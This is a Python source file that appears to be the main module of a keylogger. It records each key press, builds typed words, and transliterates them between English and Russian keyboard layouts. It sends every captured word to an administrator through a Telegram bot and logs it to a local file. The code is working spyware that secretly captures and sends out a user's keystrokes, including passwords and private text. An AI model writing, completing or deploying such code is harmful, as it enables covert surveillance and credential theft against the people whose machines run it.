from config import BLOCK_KEYS, FILE_NAME, MAX_WORDS, BOT_TOKEN, ADMIN_ID, TIME_INTERVAL
from telegram_bot import send_to_user
from datetime import timedelta, datetime


word = str()
words = [] 
block_keys = BLOCK_KEYS 
max_words = MAX_WORDS

now = datetime.now()
send_second = now + timedelta(seconds=10)

eng = "qwertyuiop[]asdfghjkl;'zxcvbnm,."
ru = "йцукенгшщзхъфывапролджэячсмитьбю"

def key_pressed(e): 
    if str(e.event_type) == "down": 
        global word 
        global words 
        global send_second
        key = e.name
        # if datetime.now() >= send_second: 
        #     space_moment()
        if key in block_keys: 
            # l = len(words)
            # if  len(words) == 0:
            #     words.append( f" <- {key} \n")
            # else: 
            #     if words[l-1] != f" <- {key} \n": 
            #         words.append( f" <- {key} \n")
            pass
        elif key == "enter":
            word += "\n" 
            space_moment() 
        elif key == "backspace": 
            l = len(word)
            word = word[:l-1]
        elif key == "space":
            # print(datetime.now(), " ?< ", send_second)
            space_moment()
        else: 
            word += key

def translate_text(text):
    global eng
    global ru
    translated_text = text.translate(str.maketrans(eng, ru))
    return str("eng - " + text + ", ru - " + translated_text)

def space_moment():
    global word
    global send_second
    # global words
    if word != "": 
        # words.append(word)
        # if len(words) >= max_words:
        data = translate_text(word)
        print("data -> ", data)
        send_to_user(data, BOT_TOKEN, ADMIN_ID)
        save_to_file(data)
        now = datetime.now()
        send_second = now + timedelta(seconds=TIME_INTERVAL)
        word = ""

def save_to_file(data): 
    with open(FILE_NAME, "r", encoding="utf-8") as file: 
        file_data = file.read()
        file.close() 
    with open(FILE_NAME, "w", encoding="utf-8") as file: 
        file.write(file_data + "\n" + data)

